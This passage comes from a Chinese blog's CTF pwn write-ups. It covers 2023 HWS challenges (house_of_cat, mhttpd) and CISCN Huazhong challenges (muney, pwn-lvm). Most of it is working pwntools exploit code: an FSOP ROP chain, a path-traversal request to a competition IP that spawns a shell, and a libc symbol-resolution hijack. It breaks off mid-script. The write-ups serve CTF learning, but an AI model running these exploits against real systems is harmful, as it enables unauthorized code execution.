function_">house_of_cat</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    flag_addr = fake_IO_file_addr + <span class="hljs-number">0x200</span><br>    data = fake_IO_file_addr + <span class="hljs-number">0x400</span><br>    payload = flat(<br>        &#123;<br>            <span class="hljs-number">0x20</span>: [<br>                    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <br>                    <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                    fake_IO_file_addr+<span class="hljs-number">0x150</span>,    <span class="hljs-comment"># rdx</span><br>                    setcontext + <span class="hljs-number">61</span><br>                ],<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,    <span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,   <span class="hljs-comment"># _lock</span><br>            <span class="hljs-number">0x90</span>: fake_IO_file_addr + <span class="hljs-number">0x30</span>,  <span class="hljs-comment"># _IO_wide_data</span><br>            <span class="hljs-number">0xb0</span>: -<span class="hljs-number">1</span>,    <span class="hljs-comment"># _mode</span><br>            <span class="hljs-number">0xc8</span>: _IO_wfile_jumps + <span class="hljs-number">0x10</span>,   <span class="hljs-comment"># fake_IO_wide_jumps</span><br>            <span class="hljs-number">0x100</span>: fake_IO_file_addr + <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0x140</span>: &#123;<br>                <span class="hljs-number">0xa0</span>: [fake_IO_file_addr + <span class="hljs-number">0x210</span>, ret]<br>            &#125;,<br>            <span class="hljs-number">0x1f0</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>            <span class="hljs-number">0x200</span>: [<br>                pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>                <span class="hljs-number">2</span>,<br>                pop_rdi_ret,<br>                flag_addr,<br>                pop_rsi_ret,<br>                <span class="hljs-number">0</span>,<br>                syscall_ret,<br><br>                pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>                <span class="hljs-number">0</span>,<br>                pop_rdi_ret,<br>                <span class="hljs-number">3</span>,<br>                pop_rsi_ret,<br>                data,<br>                pop_rdx_rbx_ret,<br>                <span class="hljs-number">0x40</span>, <span class="hljs-number">0</span>,<br>                syscall_ret,<br><br>                pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>                <span class="hljs-number">1</span>,<br>                pop_rdi_ret,<br>                <span class="hljs-number">1</span>,<br>                pop_rsi_ret,<br>                data,<br>                pop_rdx_rbx_ret,<br>                <span class="hljs-number">0x40</span>, <span class="hljs-number">0</span>,<br>                syscall_ret<br>            ]<br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content=<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><br>add(<span class="hljs-number">0x500</span>)   <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x500</span>)   <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x500</span>)   <span class="hljs-comment"># 2</span><br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">2</span>)<br><br>p.recvline()<br>heapbase = u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; ~<span class="hljs-number">0xffffff</span><br>lg(<span class="hljs-string">&#x27;heapbase&#x27;</span>, heapbase)<br><br>edit(<span class="hljs-number">2</span>, p64(heapbase + <span class="hljs-number">0x240</span>))<br><br>add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 4</span><br><br>show(<span class="hljs-number">4</span>)<br><br>mi_libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x22861</span><br>lg(<span class="hljs-string">&#x27;mi_libc_base&#x27;</span>, mi_libc_base)<br><br>libc_base = mi_libc_base - <span class="hljs-number">0x1f2000</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>_IO_2_1_stdout = libc_base + <span class="hljs-number">0x1ed6a0</span><br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1ee7e0</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x1e8f60</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x000000000015f8c6</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000630a9</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>deferred_free = mi_libc_base + <span class="hljs-number">0x75f50</span><br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 7</span><br><br>delete(<span class="hljs-number">6</span>)<br>delete(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># edit(7, p64(deferred_free))</span><br>edit(<span class="hljs-number">7</span>, p64(_IO_2_1_stdout))<br><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 8</span><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 9</span><br><br><span class="hljs-comment"># dbg()</span><br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + house_of_cat(_IO_2_1_stdout)<br>add(<span class="hljs-number">0x400</span>, payload)  <span class="hljs-comment"># 10</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-HWS-PWN-WP/image-20230717101150817.png" alt="image-20230717101150817"></p><h2 id="mhttpd"><a href="#mhttpd" class="headerlink" title="mhttpd"></a>mhttpd</h2><p>题目修改自于Tinyhttpd这个项目。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717104013884.png" alt="image-20230717104013884"></p><p><img src="/img/2023-HWS-PWN-WP/image-20230717103334947.png" alt="image-20230717103334947"></p><p>题目未限制v18的长度，导致base64解密后可以覆盖url，从而绕过路径穿越检测，达到任意文件执行的效果。</p><p>使用cyberspace生成需要的base64串。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717104430071.png" alt="image-20230717104430071"></p><p><img src="/img/2023-HWS-PWN-WP/image-20230717101625993.png" alt="image-20230717101625993"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>, <span class="hljs-number">30295</span>)<br><br>data = <span class="hljs-string">&quot;GET /l1s00t.html HTTP/1.1\r\nAuthorization: Basic QWRtaW46YWFhYWJhYWFjYWFhZGFhYWVhYWFmYWFhZ2FhYWhhYWFpYWFhamFhYWthYWFsYWFhbWFhYW5hYWFvYS8uLi8uLi8uLi8uLi8uLi8uLi8uLi9iaW4vc2g/Lmh0bWw=\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\r\n&quot;</span><br><br>p.sendline(data)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/2023-HWS-PWN-WP/image-20230717152846297.png" alt="image-20230717152846297"></p><p>参考文章：</p><p><a href="https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/">https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/</a></p><p><a href="https://www.cnblogs.com/linkwk7/p/11193728.html">https://www.cnblogs.com/linkwk7/p/11193728.html</a></p><p><a href="https://www.cnblogs.com/Five100Miles/p/12169392.html">https://www.cnblogs.com/Five100Miles/p/12169392.html</a></p><p><a href="https://github.com/EZLippi/Tinyhttpd">https://github.com/EZLippi/Tinyhttpd</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-ciscn-华中赛区-pwn-wp</title>
    <link href="/2023/07/08/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/"/>
    <url>/2023/07/08/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-ciscn-华中赛区-pwn-wp"><a href="#2023-ciscn-华中赛区-pwn-wp" class="headerlink" title="2023-ciscn-华中赛区-pwn-wp"></a>2023-ciscn-华中赛区-pwn-wp</h1><h2 id="muney"><a href="#muney" class="headerlink" title="muney"></a>muney</h2><p>检查保护</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708134910776.png" alt="image-20230708134910776"></p><p>没开PIE，且got表可写。</p><p>程序首先对我们输入的内容进行进行解析，接下来就是常规的菜单堆题了。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135001560.png" alt="image-20230708135001560"></p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135131257.png" alt="image-20230708135131257"></p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135221417.png" alt="image-20230708135221417"></p><p>至于解析格式，从题目输出<strong>HTTP_Parser&gt;</strong> 可知，应该对http参数进行解析。这里，我们随便抓一个包，获取http请求参数，然后结合动态调试就可以得到输入格式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /create HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Size: <span class="hljs-subst">&#123;size&#125;</span></span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(<span class="hljs-number">0x80</span>)&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>content = <span class="hljs-number">0x80</span> * <span class="hljs-string">&#x27;a&#x27;</span><br>payload = header + content<br></code></pre></td></tr></table></figure><p>接下来，我们分析菜单功能。这里我们主要关注<strong>add</strong> 、<strong>edit</strong> 与 <strong>quit</strong> 这三个函数。</p><p>add函数通过解析http头获取size。比较恶心的一点是size必须&gt;0xfffff，也就是使用<strong>mmap</strong>分配堆块。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708135931053.png" alt="image-20230708135931053"></p><p>edit函数并没有检查ofsize的正负性，存在负数溢出，一次最多可以写8个字节。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708140130826.png" alt="image-20230708140130826"></p><p>quit函数<strong>exit</strong>第一个参数是”&#x2F;bin&#x2F;sh” 。这里不难想到修改<strong>exit</strong>的got表为<strong>system</strong>。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708140310833.png" alt="image-20230708140310833"></p><p>这道题的难点在于使用<strong>mmap</strong>分配堆块，比赛时也是想了很久，也没想出来。这道题最终只有1解，是华科的师傅们解出来的。太厉害了。</p><p>这道题的利用方法是<strong>house of muney</strong>，之前都没听过。这次也算是长了见识。</p><ol><li>使用mmap偷取libc内存，把不可写的部分变为可写。</li><li>伪造<strong>bitmask_word</strong>、<strong>bucket</strong>、<strong>hasharr</strong>与<strong>exit_sym</strong>的<strong>st_value</strong>字段</li><li>动态解析执行system。</li></ol><p>这里主要说说如何获取bitmask_word这些关键字段。</p><p>这里，我们需要跟踪exit函数的动态解析过程。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141728423.png" alt="image-20230708141728423"></p><p>以下是exit动态解析大致调用链。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141820302.png" alt="image-20230708141820302"></p><p>这里的关键就是<strong>do_lookup_x</strong>函数，我们需要的关键字段都是在这个函数获取的。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141951293.png" alt="image-20230708141951293"></p><p>同理，继续向下跟踪就可以获取剩下的参数。</p><p>需要注意的是，我们跟踪的是第二次解析过程，也就是i&#x3D;1时的字段内容。</p><p>最终脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, p32, p16, p8<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./muney&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">content</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;HTTP_Parser&gt; &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /create HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Size: <span class="hljs-subst">&#123;size&#125;</span></span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(<span class="hljs-number">0x80</span>)&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span><br>    menu(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, offset, length, content</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /edit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;length&#125;</span></span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span></span><br><span class="hljs-string">Offset: <span class="hljs-subst">&#123;offset&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header.encode() + content<br><br>    menu(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /delete HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /quit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br><br>command = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">dir ~/tools/glibc-source/glibc-2.31/elf/</span><br><span class="hljs-string">b *0x4021CA</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># dbg(command)</span><br><br><span class="hljs-comment"># quit()</span><br><br>bitmask_offset = <span class="hljs-number">0xb88</span><br>bucket_offset = <span class="hljs-number">0xcb0</span><br>hasharr_offset = <span class="hljs-number">0x1d7c</span><br>exit_sym_offset = <span class="hljs-number">0x4d20</span><br><br>bitmask_word = <span class="hljs-number">0xf000028c0200130e</span><br>bucket = <span class="hljs-number">0x86</span><br>hasharr = <span class="hljs-number">0x7c967e3e7c93f2a0</span><br>exit_sym = <span class="hljs-number">0x000f001200002efb</span><br><br>st_value = <span class="hljs-number">0x52290</span>  <span class="hljs-comment"># system offset libc base</span><br><br>add(<span class="hljs-number">0x200000</span>)<br>edit(<span class="hljs-number">0</span>, -<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x02\x10\x21&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x211002</span>)<br><br>vmmap_offset_libc = <span class="hljs-number">0x201ff0</span><br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset, <span class="hljs-number">2</span>, p16(bitmask_word &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset + <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset + <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">40</span> &amp; <span class="hljs-number">0xff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset + <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">56</span> &amp; <span class="hljs-number">0xff</span>))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bucket_offset, <span class="hljs-number">1</span>, p8(bucket))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + hasharr_offset, <span class="hljs-number">8</span>, p64(hasharr))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p16(exit_sym &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, p8(exit_sym &gt;&gt; <span class="hljs-number">32</span> &amp; <span class="hljs-number">0xff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, p8(exit_sym &gt;&gt; <span class="hljs-number">48</span> &amp; <span class="hljs-number">0xff</span>))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset, <span class="hljs-number">3</span>, p32(st_value)[:-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># dbg()</span><br><br>quit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141239875.png" alt="image-20230708141239875"></p><h2 id="pwn-lvm"><a href="#pwn-lvm" class="headerlink" title="pwn-lvm"></a>pwn-lvm</h2><p>这道题比赛时0解。说实话有点无语，比赛时笔者把断点下在了<strong>sub_8050</strong>函数开头，就是进入不了关键逻辑。没单步几步就退了，以为有什么特殊的过滤。结果复现时，笔者又尝试把断点直接下在了关键逻辑处，发现可以直接进入关键逻辑。还是太菜了。</p><p>检查保护。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143525371.png" alt="image-20230708143525371"></p><p>几乎什么保护都没开。</p><p>程序也是一个常规的菜单堆。</p><p>Edit函数被没有检查offset的大小，存在堆溢出。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143704111.png" alt="image-20230708143704111"></p><p>Alloc函数分配了一段可读可写可执行的区域。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143804086.png" alt="image-20230708143804086"></p><p>EditAlloc函数对我们分配的区域进行写。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143907984.png" alt="image-20230708143907984"></p><p>大致利用思路就是，</p><ol><li>在我们分配的可读可写可执行区域写入shellcode。</li><li>通过堆溢出覆盖tcache的next字段，实现任意地址分配。</li><li>覆盖free_got为shellcode。</li></ol><p>说实话，笔者对这个调用链也有点迷。多次调试发现<strong>exit</strong>退出时，执行了<strong>opt-10</strong>的<strong>free_got</strong>，也就是我们的shellcode。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708144609923.png" alt="image-20230708144609923"></p><p>最终wp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//clang-10 -emit-llvm -S wp.c -o 